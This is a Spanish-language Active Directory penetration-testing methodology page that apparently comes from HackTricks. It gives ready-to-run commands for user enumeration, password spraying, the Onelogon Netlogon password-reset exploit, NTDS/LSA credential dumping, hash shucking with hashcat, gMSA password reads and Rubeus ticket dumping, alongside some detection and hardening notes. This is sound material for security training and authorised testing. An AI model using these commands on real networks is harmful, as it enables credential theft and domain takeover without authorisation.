# Metodología de Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Descripción básica

**Active Directory** es una tecnología fundamental que permite a los **administradores de red** crear y administrar de forma eficiente **dominios**, **usuarios** y **objetos** dentro de una red. Está diseñado para escalar y facilitar la organización de un gran número de usuarios en **grupos** y **subgrupos** manejables, al tiempo que controla los **derechos de acceso** en distintos niveles.

La estructura de **Active Directory** consta de tres capas principales: **dominios**, **árboles** y **bosques**. Un **dominio** abarca una colección de objetos, como **usuarios** o **dispositivos**, que comparten una base de datos común. Los **árboles** son grupos de estos dominios vinculados por una estructura común, y un **bosque** es el conjunto de varios árboles interconectados mediante **relaciones de confianza**, que conforman la capa superior de la estructura organizativa. En cada uno de estos niveles se pueden asignar **derechos de acceso** y **comunicación** específicos.

Estos son algunos conceptos clave de **Active Directory**:

1. **Directorio** – Contiene toda la información relacionada con los objetos de Active Directory.
2. **Objeto** – Designa las entidades del directorio, incluidos **usuarios**, **grupos** o **carpetas compartidas**.
3. **Dominio** – Es un contenedor de objetos del directorio. Pueden coexistir varios dominios dentro de un **bosque**, cada uno con su propia colección de objetos.
4. **Árbol** – Agrupación de dominios que comparten un dominio raíz.
5. **Bosque** – La estructura organizativa de nivel más alto en Active Directory, compuesta por varios árboles con **relaciones de confianza** entre ellos.

**Active Directory Domain Services (AD DS)** incluye una serie de servicios fundamentales para la administración centralizada y la comunicación dentro de una red. Estos servicios incluyen:

1. **Domain Services** – Centraliza el almacenamiento de datos y administra las interacciones entre **usuarios** y **dominios**, incluidas las funciones de **autenticación** y **búsqueda**.
2. **Certificate Services** – Administra la creación, distribución y gestión de **certificados digitales** seguros.
3. **Lightweight Directory Services** – Admite aplicaciones habilitadas para directorios mediante el **protocolo LDAP**.
4. **Directory Federation Services** – Proporciona capacidades de **inicio de sesión único** para autenticar usuarios en varias aplicaciones web durante una sola sesión.
5. **Rights Management** – Ayuda a proteger material con derechos de autor al regular su distribución y uso no autorizados.
6. **DNS Service** – Es fundamental para la resolución de **nombres de dominio**.

Para obtener una explicación más detallada, consulta: [**TechTerms - Definición de Active Directory**](https://techterms.com/definition/active_directory)

### **Autenticación Kerberos**

Para aprender a **atacar un AD**, es necesario **entender** muy bien el **proceso de autenticación Kerberos**.\
[**Lee esta página si aún no sabes cómo funciona.**](kerberos-authentication.md)

## Chuleta

Puedes consultar [https://wadcoms.github.io/](https://wadcoms.github.io) para ver rápidamente qué comandos puedes ejecutar para enumerar/explotar un AD.

> [!WARNING]
> La comunicación Kerberos normalmente **requiere un nombre de dominio completo (FQDN)** para que el cliente pueda obtener un ticket para el SPN correcto. El acceso a una máquina mediante su dirección IP suele recurrir a NTLM en lugar de Kerberos.

## Reconocimiento de Active Directory (sin creds/sessions)

Si solo tienes acceso a un entorno AD, pero no tienes credenciales/sesiones, puedes:

- **Hacer pentest de la red:**
  - Escanear la red, encontrar máquinas y puertos abiertos, e intentar **explotar vulnerabilidades** o **extraer credenciales** de ellas (por ejemplo, [las impresoras pueden ser objetivos muy interesantes](ad-information-in-printers.md)).
  - La enumeración de DNS puede revelar información sobre servidores clave del dominio, como web, impresoras, shares, VPN, media, etc.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Consulta la [**Metodología de pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) general para obtener más información sobre cómo hacerlo.
- **Comprobar el acceso null y Guest en los servicios SMB** (esto no funcionará en versiones modernas de Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Aquí encontrarás una guía más detallada sobre cómo enumerar un servidor SMB:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerar LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Aquí encontrarás una guía más detallada sobre cómo enumerar LDAP (presta **especial atención al acceso anónimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Envenenar la red**
  - Recopilar credenciales [**suplantando servicios con Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Obtener acceso al host [**abusando del relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Recopilar credenciales **exponiendo** [**servicios UPnP falsos con evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Extraer nombres de usuario/nombres de documentos internos, redes sociales y servicios (principalmente web) de los entornos del dominio, así como de fuentes disponibles públicamente.
  - Si encuentras los nombres completos de los empleados de una empresa, puedes probar distintas **convenciones de nombres de usuario** de AD (**[lee esto](https://activedirectorypro.com/active-directory-user-naming-convention/)**). Las convenciones más comunes son: _NombreApellido_, _Nombre.Apellido_, _NomApe_ (3 letras de cada uno), _Nom.Ape_, _NApellido_, _N.Apellido_, _ApellidoNombre_, _Apellido.Nombre_, _ApellidoN_, _Apellido.N_, 3 _letras aleatorias y 3 números aleatorios_ (abc123).
  - Herramientas:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeración de usuarios

- **Enumeración anónima de SMB/LDAP:** Consulta las páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) y [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeración con Kerbrute**: Cuando se solicita un **nombre de usuario no válido**, el servidor responde con el código de error de **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, lo que nos permite determinar que el nombre de usuario no es válido. Para los **nombres de usuario válidos**, se obtiene el **TGT en una respuesta AS-REP** o el error _KRB5KDC_ERR_PREAUTH_REQUIRED_, que indica que el usuario debe realizar la preautenticación.
- **Sin autenticación contra MS-NRPC**: Usar auth-level = 1 (sin autenticación) contra la interfaz MS-NRPC (Netlogon) en los controladores de dominio. El método llama a la función `DsrGetDcNameEx2` después de enlazar la interfaz MS-NRPC para comprobar si el usuario o el equipo existen sin credenciales. La herramienta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa este tipo de enumeración. Puedes encontrar la investigación [aquí](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **Servidor OWA (Outlook Web Access)**

Si encontraste uno de estos servidores en la red, también puedes realizar **enumeración de usuarios contra él**. Por ejemplo, podrías usar la herramienta [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Puedes encontrar listas de nombres de usuario en [**este repositorio de GitHub**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) y en este otro ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Sin embargo, deberías tener los **nombres de las personas que trabajan en la empresa**, obtenidos durante el paso de recon que deberías haber realizado antes. Con el nombre y el apellido, podrías usar el script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para generar posibles nombres de usuario válidos.

### Abuso de la allow-list de canales vulnerables de Netlogon (Onelogon)

Aunque **Zerologon** esté parcheado en el DC, las cuentas explícitamente incluidas en la allow-list pueden seguir expuestas al **comportamiento heredado/vulnerable del canal seguro de Netlogon**. La configuración de riesgo es la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** o el valor de registro correspondiente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ese valor es un **descriptor de seguridad SDDL** (consulta [Security Descriptors](security-descriptors.md)). Se puede atacar cualquier cuenta o grupo al que se le haya concedido la ACE correspondiente en la DACL. Por ejemplo, `O:BAG:BAD:(A;;RC;;;WD)` incluye efectivamente a **Everyone** en la allow-list.

Flujo de trabajo práctico para el operador:

1. **Identifica los principales incluidos en la allow-list** revisando tanto **SYSVOL/GPO** como el **registro del DC activo**.
2. **Resuelve los SID** encontrados en el SDDL para identificar a los usuarios/equipos reales de AD y da prioridad a las **cuentas de equipo de los DC**, las **cuentas de confianza** y otras máquinas con privilegios.
3. Intenta repetidamente la **autenticación MS-NRPC / Netlogon** como la cuenta incluida en la allow-list.
4. Tras acertar, abusa de la **configuración de contraseñas de Netlogon** para restablecer la contraseña de la cuenta objetivo (el PoC público la establece como una cadena vacía).<sup>[[9]](#references)[[10]](#references)</sup>

Ejemplos rápidos de triaje / laboratorio del artefacto público:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notas:

- El **escáner** es útil porque la lista efectiva de permitidos puede estar en **SYSVOL**, en el **registro** o en ambos.
- La ruta del exploit es importante porque **no requiere privilegios de Domain Admin** una vez identificada una cuenta vulnerable.
- Comprometer una **cuenta de máquina de un Domain Controller**, como `DC$`, es especialmente peligroso porque restablecer esa contraseña puede habilitar directamente otras rutas para la **toma de control de AD**.
- La viabilidad de la **fuerza bruta** depende del modo: el artefacto público describe un enfoque meet-in-the-middle, una fuerza bruta de **24 bits** cuando hay otra cuenta de equipo disponible y variantes más lentas de **32 bits**.

Notas de detección y hardening:

- Audita la política de la lista de permitidos y elimina todo salvo las excepciones temporales de compatibilidad que sean explícitamente necesarias.
- Supervisa los eventos **5827/5828/5829/5830/5831** del **System** del DC para detectar conexiones vulnerables de Netlogon que se deniegan, descubren o permiten explícitamente según la política.
- Trata las cuentas de `VulnerableChannelAllowList` como de **alto riesgo** hasta que se elimine la dependencia heredada.

### Conocer uno o varios nombres de usuario

Bien, ya sabes que tienes un nombre de usuario válido, pero ninguna contraseña... Entonces prueba lo siguiente:

- [**ASREPRoast**](asreproast.md): Si un usuario **no tiene** el atributo _DONT_REQ_PREAUTH_, puedes **solicitar un mensaje AS_REP** para ese usuario, que contendrá algunos datos cifrados mediante una derivación de la contraseña del usuario.
- [**Password Spraying**](password-spraying.md): Prueba las **contraseñas más comunes** con cada uno de los usuarios descubiertos; quizá alguno esté usando una contraseña débil (¡ten en cuenta la política de contraseñas!).
  - También puedes hacer **password spraying contra servidores OWA** para intentar acceder a los servidores de correo de los usuarios.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Es posible que puedas **obtener** algunos **hashes** de desafío al envenenar algunos protocolos de la **red**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

La enumeración de Active Directory proporciona nombres de usuario, identificadores de correo electrónico y patrones de nombres, posibles hosts y servicios a los que se puede inducir a autenticarse. Usa ese contexto para identificar posibles [**ataques de relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM y posibles rutas hacia el entorno de AD.

### NetExec: reconocimiento basado en workspaces y comprobaciones de postura de relay

- Usa **workspaces de `nxcdb`** para mantener el estado del reconocimiento de AD por cada engagement: `workspace create <name>` crea bases de datos SQLite por protocolo en `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia de vista con `proto smb|mssql|winrm` y lista los secretos recopilados con `creds`. Elimina manualmente los datos confidenciales al terminar: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- La detección rápida de subredes con **`netexec smb <cidr>`** muestra el **dominio**, la **compilación del SO**, los **requisitos de firma SMB** y **Null Auth**. Los equipos miembros que muestran `(signing:False)` son **vulnerables al relay**, mientras que los DC suelen exigir la firma.
- Genera **nombres de host en /etc/hosts** directamente a partir de la salida de NetExec para facilitar el targeting:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Cuando **SMB relay al DC está bloqueado** por la firma, sigue comprobando la postura de **LDAP**: `netexec ldap <dc>` destaca `(signing:None)` / un channel binding débil. Un DC que requiere firma SMB pero tiene deshabilitada la firma LDAP sigue siendo un objetivo viable para **relay a LDAP** y abusos como **RBCD sin SPN**.

### Filtraciones de credenciales del lado del cliente mediante impresoras → validación masiva de credenciales de dominio

- Las interfaces web de impresoras a veces **incluyen contraseñas de administrador enmascaradas en el HTML**. Ver el código fuente o usar las herramientas para desarrolladores puede revelar el texto sin cifrar (p. ej., `<input value="<password>">`), lo que permite acceder mediante Basic-auth a repositorios de escaneo e impresión.
- Los trabajos de impresión recuperados pueden contener **documentos de incorporación en texto sin cifrar** con contraseñas por usuario. Mantén alineadas las correspondencias al hacer las pruebas:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Robar credenciales NTLM

Si puedes **acceder a otros PCs o shares** con el **usuario null o guest**, podrías **colocar archivos** (como un archivo SCF) que, si alguien accede a ellos, podrían d**esencadenar una autenticación NTLM contra ti** para que puedas **robar** el **desafío NTLM** y descifrarlo:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking y ataques NT-Candidate

**Hash shucking** trata cada hash NT que ya tienes como una contraseña candidata para otros formatos más lentos cuyo material de clave se deriva directamente del hash NT. En lugar de aplicar fuerza bruta a frases de contraseña largas en tickets Kerberos RC4, desafíos NetNTLM o credenciales almacenadas en caché, introduces los hashes NT en los modos NT-candidate de Hashcat y dejas que valide la reutilización de contraseñas sin tener que descubrir el texto plano. Esto resulta especialmente potente después de comprometer un dominio, cuando puedes recolectar miles de hashes NT actuales e históricos.<sup>[[5]](#references)</sup>

Usa shucking cuando:

- Tienes un corpus NT obtenido mediante DCSync, volcados SAM/SECURITY o bóvedas de credenciales y necesitas comprobar si se reutilizan en otros dominios/bosques.
- Capturas material Kerberos basado en RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respuestas NetNTLM o blobs DCC/DCC2.
- Quieres demostrar rápidamente la reutilización de frases de contraseña largas e imposibles de descifrar y pivotar de inmediato mediante Pass-the-Hash.

La técnica **no funciona** contra tipos de cifrado cuyas claves no son el hash NT (p. ej., Kerberos etype 17/18 AES). Si un dominio exige solo AES, debes volver a los modos normales de contraseña.

#### Crear un corpus de hashes NT

- **DCSync/NTDS**: usa `secretsdump.py` con el historial para obtener el conjunto más grande posible de hashes NT (y sus valores anteriores):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Las entradas del historial amplían considerablemente el conjunto de candidatos, porque Microsoft puede almacenar hasta 24 hashes anteriores por cuenta. Para conocer más formas de obtener secretos de NTDS, consulta:

{{#ref}}
dcsync.md
{{#endref}}

- **Volcados de caché de endpoints** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) extrae datos locales de SAM/SECURITY y credenciales de dominio almacenadas en caché (DCC/DCC2). Elimina los duplicados y añade esos hashes a la misma lista `nt_candidates.txt`.
- **Registrar metadatos** – Conserva el nombre de usuario/dominio que produjo cada hash (aunque la wordlist solo contenga valores hexadecimales). Cuando Hashcat muestre el candidato ganador, los hashes coincidentes te indicarán de inmediato qué principal está reutilizando una contraseña.
- Prioriza candidatos del mismo forest o de un forest de confianza; esto maximiza la probabilidad de coincidencia al hacer shucking.

#### Modos de candidatos NT de Hashcat

| Tipo de hash                             | Modo de contraseña | Modo de candidatos NT |
| ---------------------------------------- | ------------------ | -------------------- |
| Domain Cached Credentials (DCC)          | 1100               | 31500                |
| Domain Cached Credentials 2 (DCC2)       | 2100               | 31600                |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500               | 27000                |
| NetNTLMv2                                | 5600               | 27100                |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500               | _N/A_                |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100              | 35300                |
| Kerberos 5 etype 23 AS-REP               | 18200              | 35400                |

Notas:

- Las entradas de candidatos NT **deben seguir siendo hashes NT sin procesar de 32 caracteres hexadecimales**. Desactiva los motores de reglas (sin `-r` ni modos híbridos), porque las transformaciones corrompen el material de clave de los candidatos.
- Estos modos no son intrínsecamente más rápidos, pero el espacio de claves de NTLM (~30,000 MH/s en un M3 Max) es ~100× más rápido que Kerberos RC4 (~300 MH/s). Probar una lista de NT seleccionada es mucho menos costoso que explorar todo el espacio de contraseñas en el formato lento.
- Usa siempre la **versión más reciente de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), porque los modos 31500/31600/35300/35400 se publicaron hace poco.<sup>[[7]](#references)</sup>
- Actualmente no hay un modo NT para AS-REQ Pre-Auth, y los etypes AES (19600/19700) requieren la contraseña en texto plano, porque sus claves se derivan mediante PBKDF2 a partir de contraseñas UTF-16LE, no de hashes NT sin procesar.

#### Ejemplo – Kerberoast RC4 (modo 35300)

1. Captura un TGS RC4 para un SPN objetivo con un usuario con pocos privilegios (consulta la página de Kerberoast para más detalles):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Extrae el ticket con tu lista NT:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat deriva la clave RC4 de cada candidato NT y valida el blob `$krb5tgs$23$...`. Una coincidencia confirma que la cuenta de servicio usa uno de tus hashes NT existentes.

3. Inmediatamente, haz pivot mediante PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Puedes recuperar opcionalmente el texto plano más adelante con `hashcat -m 1000 <matched_hash> wordlists/` si es necesario.

#### Ejemplo – Credenciales en caché (mode 31600)

1. Extrae los inicios de sesión almacenados en caché de una estación de trabajo comprometida:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Copia la línea DCC2 del usuario de dominio de interés en `dcc2_highpriv.txt` y hazle shucking:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Una coincidencia exitosa produce el hash NT que ya conoces y tienes en tu lista, lo que demuestra que el usuario en caché está reutilizando una contraseña. Úsalo directamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) o haz brute-force en modo NTLM rápido para recuperar la cadena.

El mismo flujo de trabajo se aplica a las respuestas a desafíos NetNTLM (`-m 27000/27100`) y a DCC (`-m 31500`). Una vez identificada una coincidencia, puedes iniciar un relay, PtH por SMB/WMI/WinRM o volver a crackear el hash NT sin conexión con máscaras/reglas.



## Enumerating Active Directory CON credenciales/sesión

Para esta fase necesitas haber **comprometido las credenciales o una sesión de una cuenta de dominio válida.** Si tienes credenciales válidas o un shell como usuario del dominio, **recuerda que las opciones mencionadas antes siguen siendo opciones para comprometer a otros usuarios**.

Antes de empezar la enumeración autenticada, entiende el **problema de double-hop de Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeración

Comprometer una cuenta es un **paso importante para evaluar el dominio**, porque permite realizar **enumeración de Active Directory** autenticada:

En cuanto a [**ASREPRoast**](asreproast.md), ahora puedes encontrar todos los usuarios potencialmente vulnerables; y, en cuanto a [**Password Spraying**](password-spraying.md), puedes obtener una **lista de todos los nombres de usuario** y probar la contraseña de la cuenta comprometida, contraseñas vacías y nuevas contraseñas prometedoras.

- Puedes usar [**CMD para hacer un reconocimiento básico**](../basic-cmd-for-pentesters.md#domain-info)
- También puedes usar [**powershell para reconocimiento**](../basic-powershell-for-pentesters/index.html), que será más sigiloso
- También puedes [**usar powerview**](../basic-powershell-for-pentesters/powerview.md) para extraer información más detallada
- Otra herramienta excelente para el reconocimiento en un Active Directory es [**BloodHound**](bloodhound.md). **No es muy sigilosa** (depende de los métodos de recopilación que uses), pero **si no te importa**, deberías probarla. Averigua dónde pueden hacer RDP los usuarios, encuentra rutas a otros grupos, etc.
  - **Otras herramientas automatizadas de enumeración de AD son:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Revisa los [**registros DNS de AD**](ad-dns-records.md), ya que podrían contener información interesante.
- **AdExplorer.exe**, de la suite **SysInternal**, es una **herramienta con GUI** que puedes usar para enumerar el directorio.
- También puedes buscar en la base de datos LDAP con **ldapsearch** para encontrar credenciales en los campos _userPassword_ y _unixUserPassword_, e incluso en las notas _description_ e _info_ de los usuarios. Un token con aspecto de contraseña y sin etiqueta en _info_ es solo un posible candidato: confirma por separado su propósito y validez, y evita incluir el contenido de las notas en la salida de enumeración habitual. Consulta [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para ver otros métodos.
- Revisa los scripts **accesibles** de inicio de sesión del dominio y de asignación de unidades en `\\<dc>\NETLOGON` o `\\<dc>\SYSVOL\<domain>\scripts` cuando tengas autorización. [Microsoft documenta](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) el papel del directorio de scripts del recurso compartido NETLOGON. Primero enumera los nombres y luego inspecciona solo los scripts relevantes y legibles, dentro de un límite de tamaño; no vuelques todo el recurso compartido ni muestres valores de credenciales durante la enumeración habitual. Una llamada de PowerShell a [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **no** protege una contraseña literal almacenada en el script. La llamada por sí sola no demuestra que haya un secreto codificado directamente: rastrea su entrada real y luego verifica por separado la cuenta, la validez de las credenciales y los privilegios. Revisar un script del dominio implica inspeccionar un recurso compartido remoto; es algo distinto de enumerar un host local.
- Si usas **Linux**, también puedes enumerar el dominio con [**pywerview**](https://github.com/the-useless-one/pywerview).
- También puedes probar herramientas automatizadas como:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracción de todos los usuarios del dominio**

  Es muy fácil obtener todos los nombres de usuario del dominio desde Windows (`net user /domain` ,`Get-DomainUser` o `wmic useraccount get name,sid`). En Linux, puedes usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Aunque esta sección de enumeración parezca breve, es la parte más importante de todas. Abre los enlaces (sobre todo los de cmd, powershell, powerview y BloodHound), aprende a enumerar un dominio y practica hasta sentirte cómodo. Durante una evaluación, este será el momento clave para encontrar el camino hacia DA o decidir que no se puede hacer nada.

### Cuentas de equipo precreadas predecibles -> acceso a contraseñas de gMSA

Las cuentas de equipo preparadas para uniones heredadas pueden conservar una contraseña inicial predecible. El módulo `pre2k` de NetExec identifica el valor característico `userAccountControl` de `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) e intenta obtener un TGT de Kerberos con los primeros 14 caracteres del nombre del equipo en minúsculas, sin el `$` final. Considera este valor de UAC como un selector de posibles candidatos, en lugar de asumir que pertenecer a **Pre-Windows 2000 Compatible Access** demuestra por sí solo que la contraseña es débil.<sup>[[18]](#references)[[20]](#references)</sup>

Usa la enumeración LDAP autenticada para probar los candidatos y guardar los TGT obtenidos correctamente. `ALL=True` amplía las pruebas a objetos que no coinciden con el filtro predeterminado `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Un bind predeterminado/NTLM fallido **no** invalida este hallazgo: prueba con `-k`, un FQDN que resuelva a la DC y un reloj sincronizado con el KDC. Las ejecuciones correctas del módulo escriben listas de candidatos y ccaches adquiridos en `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Tras comprometer el principal del equipo, analiza sus pertenencias a grupos anidados y sus permisos salientes. En particular, los principales nombrados en el descriptor de seguridad `msDS-GroupMSAMembership` de una gMSA pueden leer `msDS-ManagedPassword`; la salida de `--gmsa` de NetExec muestra los principales autorizados y devuelve el hash NT actual cuando el equipo que se autentica tiene autorización.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Luego evalúa el gMSA recuperado como cualquier otra credencial: inspecciona la pertenencia a grupos locales/del dominio, los derechos de inicio de sesión, los SPN, la delegación y los servicios accesibles antes de intentar pass-the-hash. Esta vía de recuperación basada en ACL es distinta de [Golden gMSA/dMSA](golden-dmsa-gmsa.md), que deriva contraseñas administradas tras comprometer la clave raíz de KDS.<sup>[[20]](#references)</sup>

Una entidad de equipo también puede tener control saliente sobre otros objetos de equipo o grupos. Después de obtener una, inspecciona por separado sus pertenencias anidadas y las ACL efectivas: un permiso de escritura sobre otro objeto de equipo puede permitir cambiar una cuenta, y los permisos para agregar miembros a grupos pueden conducir a un rol de inicio de sesión. Un indicador de cuenta provisional, una convención de nombres predecible o una relación `GenericWrite` por sí solos no demuestran la ruta completa.

Una copia legible de un blob `msDS-ManagedPassword` en un archivo, recurso compartido o copia de seguridad es una vía de exposición independiente: la ACL de lectura de LDAP no puede proteger una copia almacenada en otro lugar. Valida que los datos sean un blob de contraseña administrada antes de interpretarlos, y distingue esta situación tanto de una lectura LDAP autorizada como de la derivación mediante la clave raíz de KDS.

### Kerberoast

Kerberoasting consiste en obtener **tickets TGS** utilizados por servicios asociados a cuentas de usuario y crackear su cifrado —basado en las contraseñas de los usuarios— **offline**.

Más información sobre esto en:


{{#ref}}
kerberoast.md
{{#endref}}

### Conexión remota (RDP, SSH, FTP, Win-RM, etc.)

Una vez obtenidas algunas credenciales, puedes comprobar si tienes acceso a alguna **máquina**. Para ello, puedes usar **CrackMapExec** para intentar conectarte a varios servidores mediante distintos protocolos, según los escaneos de puertos que hayas realizado.

### Escalada de privilegios local

Si has comprometido credenciales o tienes una sesión como usuario normal del dominio y puedes acceder a **cualquier máquina del dominio**, busca una vía para **escalar privilegios localmente y recopilar credenciales**. Los privilegios de administrador local pueden permitirte **volcar los hashes de otros usuarios** desde la memoria (LSASS) y el almacenamiento local (SAM).

En este libro hay una página completa sobre [**escalada de privilegios local en Windows**](../windows-local-privilege-escalation/index.html) y una [**lista de comprobación**](../checklist-windows-privilege-escalation.md). Además, no olvides usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets de la sesión actual

Es muy **poco probable** que encuentres **tickets** en el usuario actual que **te den permiso para acceder** a recursos inesperados, pero puedes comprobarlo:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

